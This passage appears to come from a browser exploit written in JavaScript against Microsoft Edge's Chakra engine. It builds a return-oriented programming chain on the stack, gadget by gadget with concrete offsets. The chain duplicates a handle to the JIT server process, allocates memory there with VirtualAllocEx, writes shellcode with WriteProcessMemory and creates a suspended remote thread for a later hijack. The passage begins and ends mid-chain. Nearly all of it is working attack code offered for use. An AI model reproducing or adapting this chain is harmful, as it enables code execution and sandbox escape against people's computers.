// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);

// Helper function to be called after each stack write to increment offset to be written to
function next()
{
    counter+=0x8;
}

// Begin ROP chain
// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

// DuplicateHandle() ROP chain
// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
// ACG is disabled in the JIT process
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

// HANDLE hSourceHandle (RDX)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
next();

// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPHANDLE lpTargetHandle (R9)
// This needs to be a writable address where the full JIT handle will be stored
// Using .data section of chakra.dll in a part where there is no data
/*
0:053> dqs chakra+0x72E000+0x20010
00007ffc`052ae010  00000000`00000000
00007ffc`052ae018  00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hSourceProcessHandle (RCX)
// Handle to the JIT process from the content process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
next();

// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();

// VirtuaAllocEx() ROP chain
// Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

// DWORD flAllocationType (R9)
// MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
/*
0:031> ? 0x00002000 | 0x00001000 
Evaluate expression: 12288 = 00000000`00003000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// SIZE_T dwSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPVOID lpAddress (RDX)
// Let VirtualAllocEx decide where the memory will be located
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     				   // Recall RAX already has a writable pointer in it

// Call KERNELBASE!VirtualAllocEx
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain
// Stage 3 -> Write our shellcode into the JIT process

// Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)

/*
0:015> dq kernelbase+0x216000+0x4000 L2
00007fff`58cfa000  00000000`00000000 00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     // Recall RAX already has a writable pointer in it

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);      // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// LPCVOID lpBuffer (R8) (shellcode in chakra.dll .data section)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);    	  // .data section of chakra.dll holding our shellcode
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// CreateRemoteThread() ROP chain
// Stage 4 -> Create a thread within the JIT process, but create it suspended
// This will allow the thread to _not_ execute until we are ready
// LPTHREAD_START_ROUTINE can be set to anything, as CFG will check it and we will end up setting RIP directly later
// We will eventually hijack RSP of this thread with a ROP chain, and by setting RIP to a return gadget our thread, when executed, will return into our ROP chain
// We will update the thread later via another ROP chain to call SetThreadContext()

// LPTHREAD_START_ROUTINE lpStartAddress (R9)
// This can be any random data, since it will never be executed
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // 0x180043c63: Anything we want - this will never get executed
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();

// LPSECURITY_ATTRIBUTES lpThreadAttributes (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (default security properties)
next();

// SIZE_T dwStackSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // 0 (default stack size)
next();

// Call KERNELBASE!CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xdcfd0, kernelbaseHigh); // KERNELBASE!CreateRemoteThread
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!CreateRemoteThread)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!CreateRemoteThread - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPVOID lpParameter (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD dwCreationFlags (RSP+0x30) (CREATE_SUSPENDED to avoid executing the thread routine)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPDWORD lpThreadId (RSP+0x38)
next();

// WriteProcessMemory() ROP chain (Number 2)
// Stage 5 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rcx gadget for lpAddress

// Before, we need to preserve the thread HANDLE returned by CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where we will store the thread HANDLE
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetOne, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain (Number 3)
// Stage 6 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rdi gadget for our "fake return address"

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetTwo, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
